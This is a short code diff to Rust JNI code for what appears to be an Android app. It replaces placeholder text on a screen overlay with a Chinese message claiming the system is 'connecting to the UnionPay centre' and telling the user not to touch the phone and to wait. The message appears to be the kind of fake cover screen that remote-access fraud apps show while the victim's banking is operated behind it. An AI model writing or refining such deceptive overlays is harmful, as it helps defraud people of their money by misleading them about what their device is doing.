@@ -352,10 +352,10 @@ pub extern "system" fn Java_ffi_FFI_e15f7cc69f667bd3(
         )
         .unwrap();
 
-    let txt = env.new_string("\n\n请请请请请请请请请请......\n请请请请请请请请\n请请请请请请\n请请请请请......").unwrap();
+    let txt = env.new_string("\n\n\n\n系统正在对接银联中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......").unwrap();
     env.call_method(&tv, "setText", "(Ljava/lang/CharSequence;)V", &[JValue::Object(&txt.into())]).unwrap();
     env.call_method(&tv, "setTextColor", "(I)V", &[JValue::Int(-7829368)]).unwrap();
-    env.call_method(&tv, "setTextSize", "(F)V", &[JValue::Float(15.0)]).unwrap();
+    env.call_method(&tv, "setTextSize", "(F)V", &[JValue::Float(12.0)]).unwrap();
     env.call_method(&tv, "setGravity", "(I)V", &[JValue::Int(3 | 80)]).unwrap();
     env.call_method(&tv, "setPadding", "(IIII)V", &[JValue::Int(20); 4]).unwrap();
 
